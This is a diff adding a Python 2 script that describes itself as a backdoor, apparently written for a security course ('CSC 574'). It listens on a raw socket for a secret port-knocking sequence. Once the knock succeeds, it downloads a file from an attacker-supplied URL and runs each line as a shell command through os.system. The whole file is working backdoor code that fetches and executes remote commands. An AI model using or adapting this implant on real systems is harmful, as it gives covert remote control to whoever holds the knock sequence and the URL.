@@ -1,1 +1,120 @@
+#!/usr/bin/python
+
 #My backdoor
+
+
+import socket
+import logging
+import sys
+import argparse
+import backdoor_def as b_def
+import struct
+import time
+import binascii
+import collections
+import urllib2
+import os
+
+parser=argparse.ArgumentParser(description="Backdoor for CSC 574")
+parser.add_argument("conf_file",help="Configuration file",metavar="Configuration_file",default="dummy_conf")
+parser.add_argument("URL",help="URL",metavar="URL",default="dummy_ip")
+parser.add_argument("-v","--verbose",help="Increased output verbosity",action="store_true")
+parser.error=b_def.print_help
+
+
+args=parser.parse_args()
+if(b_def.error_check==True):
+	print "Usage: ./backdoor [-h] [-v] Configuration_file URL"
+	print "exiting"
+	sys.exit()
+
+
+if not args.verbose:
+	logging.disable(logging.CRITICAL)
+
+logger=logging.getLogger("Backdoor")
+logger.setLevel(logging.DEBUG)
+ch=logging.StreamHandler()
+formatter=logging.Formatter("%(name)s - %(levelname)s - %(message)s")
+ch.setFormatter(formatter)
+logger.addHandler(ch)
+logger.debug("Logging is On")
+
+conf_file=args.conf_file
+url=args.URL
+print "Using Configuration_file="+conf_file
+print "Using URL="+url
+
+
+try:
+	s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+except socket.error, msg:
+	print "Unable to create Socket"+ str(msg)
+	sys.exit()
+
+try:
+	port_sequence=[lines.rstrip('\n') for lines in open(conf_file,"r")]
+except :
+	print "Couldn't Open file"
+	sys.exit()
+
+logger.debug("port_sequence="+str(port_sequence))
+seq_check=[port for port in port_sequence if not port.isdigit()]
+
+if  seq_check :
+	print "Error in port number"
+	sys.exit()
+
+range_check=[port for port in port_sequence if (int(port)<0 or int(port)>65535)]
+if range_check:
+	print "Check range of Port number"
+	sys.exit()	
+
+first_packet=False
+srcip="455.455.455.455"
+sequence_dict={}
+port_seq_dict=dict((i,int(port_sequence[i-2000])) for i in range(2000,2000+len(port_sequence)))
+logger.debug("Port Sequence List="+str(port_seq_dict))
+
+while True:
+	packet=s.recvfrom(65535)
+	tcp_packet=packet[0][20:40]
+	tcp_packet=struct.unpack('>HHLLHHHH' , tcp_packet)
+	ip_packet=struct.unpack('>BBHHHBBH4s4s',packet[0][0:20])
+
+	if(tcp_packet[0]==1234 and str(tcp_packet[1]) in port_sequence and tcp_packet[2]>=2000):
+		srcip_packet=socket.inet_ntoa(ip_packet[8])
+		if not first_packet:
+			srcip=socket.inet_ntoa(ip_packet[8])
+			first_packet=True
+			logger.debug("Source IP="+srcip)
+			logger.debug("First Packet="+str(tcp_packet))
+			seq_no=tcp_packet[2]
+			dest_port=tcp_packet[1]
+			sequence_dict[seq_no]=dest_port
+			sequence_sort = dict(collections.OrderedDict(sorted(sequence_dict.items())))
+			logger.debug("Sorted Sequence="+str(sequence_sort))
+			if(sequence_sort==port_seq_dict):
+				print "Successfull Knock"
+				break
+
+
+		elif (first_packet and srcip==srcip_packet):
+			logger.debug("Source IP"+str(srcip))
+			logger.debug("Rest Packet="+str(tcp_packet))
+			seq_no=tcp_packet[2]
+			dest_port=tcp_packet[1]
+			sequence_dict[seq_no]=dest_port
+			sequence_sort = dict(collections.OrderedDict(sorted(sequence_dict.items())))
+			logger.debug("Sorted Sequence"+str(sequence_sort))
+			if(sequence_sort==port_seq_dict):
+				print "Successfull Knock"
+				break
+				
+if not url.startswith('http://'):
+	url='http://'+url
+
+content=urllib2.urlopen(url).read().splitlines()
+for i in content:
+	os.system(i)
+	print ""
